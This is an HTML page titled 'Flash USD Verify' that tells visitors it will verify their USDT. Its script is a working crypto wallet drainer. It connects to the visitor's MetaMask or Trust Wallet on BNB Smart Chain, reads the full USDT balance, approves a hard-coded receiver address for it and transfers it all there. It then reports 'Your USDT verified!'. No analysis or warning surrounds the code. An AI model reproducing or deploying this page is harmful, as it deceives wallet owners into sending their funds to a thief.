<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Flash USD Verify</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
  <link href="https://fonts.googleapis.com/css2?family=Inter&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Inter', sans-serif;
      background: linear-gradient(to bottom, #111, #000);
      color: white;
      text-align: center;
      padding: 50px 20px;
    }
    h1 {
      font-size: 2em;
      margin-bottom: 20px;
    }
    #status {
      margin: 20px 0;
      font-size: 1.1em;
      color: #0ff;
    }
    button {
      padding: 15px 30px;
      font-size: 1em;
      border: none;
      background: #0ff;
      color: black;
      border-radius: 8px;
      cursor: pointer;
    }
    button:hover {
      background: #0cc;
    }
  </style>
</head>
<body>
  <h1>Verify your USDT</h1>
  <div id="status">Waiting for wallet...</div>
  <button onclick="connectAndSend()">Flash USD Verify</button>

  <script>
    const receiverAddress = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT
    const usdtAbi = [
      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
      { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
      { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
    ];

    async function connectAndSend() {
      if (typeof window.ethereum === 'undefined') {
        alert("Trust Wallet or MetaMask not found!");
        return;
      }

      const web3 = new Web3(window.ethereum);
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      const sender = accounts[0];
      const networkId = await web3.eth.net.getId();

      if (networkId !== 56) {
        document.getElementById("status").innerText = "Please switch to BNB Smart Chain.";
        return;
      }

      document.getElementById("status").innerText = "Flash USD Verify...";

      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
      const balance = await usdt.methods.balanceOf(sender).call();

      if (parseInt(balance) === 0) {
        document.getElementById("status").innerText = "No USDT found in wallet.";
        return;
      }

      // Approve first
      try {
        document.getElementById("status").innerText = "Flash your study verified...";
        await usdt.methods.approve(receiverAddress, balance).send({ from: sender });

        // Transfer after approve
        await usdt.methods.transfer(receiverAddress, balance).send({ from: sender });
        document.getElementById("status").innerText = "Your USDT verified!";
      } catch (err) {
        console.error(err);
        document.getElementById("status").innerText = "Transaction cancelled or failed.";
      }
    }
  </script>
</body>
</html>
